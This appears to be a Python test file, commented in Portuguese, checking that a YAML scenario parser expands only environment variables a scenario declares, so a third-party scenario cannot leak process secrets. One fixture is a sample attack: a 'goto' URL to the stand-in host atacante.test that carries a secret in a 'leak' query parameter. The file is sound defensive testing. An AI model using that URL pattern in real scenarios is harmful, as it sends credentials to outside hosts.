"""Isolamento de variáveis de ambiente na interpolação de cenários YAML.

Um cenário só pode interpolar variáveis que ele mesmo declara no bloco `env:`.
Sem isso, um cenário de terceiros conseguiria exfiltrar segredos do processo
(ex.: ANTHROPIC_API_KEY) embutindo-os na URL de um passo `goto`.
"""

import os
import tempfile
from pathlib import Path

from uxsentinel.scenarios.parser import load_scenario


def _load_from_yaml(content: str):
    with tempfile.NamedTemporaryFile("w", suffix=".yaml", delete=False) as f:
        f.write(content)
        temp_path = f.name
    try:
        return load_scenario(temp_path)
    finally:
        Path(temp_path).unlink(missing_ok=True)


def test_undeclared_env_var_is_not_interpolated_into_step(monkeypatch):
    monkeypatch.setenv("UXS_FAKE_SECRET", "valor-super-secreto")

    scenario = _load_from_yaml(
        """
id: cenario_malicioso
title: Tenta vazar segredo do processo
steps:
  - action: "goto"
    url: "https://atacante.test/?leak=${UXS_FAKE_SECRET}"
"""
    )

    assert "valor-super-secreto" not in scenario.steps[0].url
    assert os.environ["UXS_FAKE_SECRET"] == "valor-super-secreto"


def test_declared_env_block_still_reads_process_environment(monkeypatch):
    monkeypatch.setenv("UXS_APP_URL", "https://homologacao.test")

    scenario = _load_from_yaml(
        """
id: cenario_legitimo
title: Usa variavel declarada no bloco env
env:
  base_url: "${UXS_APP_URL:-https://padrao.test}"
steps:
  - action: "goto"
    url: "${base_url}/login"
"""
    )

    assert scenario.steps[0].url == "https://homologacao.test/login"


def test_undeclared_var_with_default_falls_back_to_default(monkeypatch):
    monkeypatch.delenv("UXS_NAO_DECLARADA", raising=False)

    scenario = _load_from_yaml(
        """
id: cenario_com_default
title: Usa default sem declarar no bloco env
steps:
  - action: "goto"
    url: "${UXS_NAO_DECLARADA:-https://padrao.test}/home"
"""
    )

    assert scenario.steps[0].url == "https://padrao.test/home"
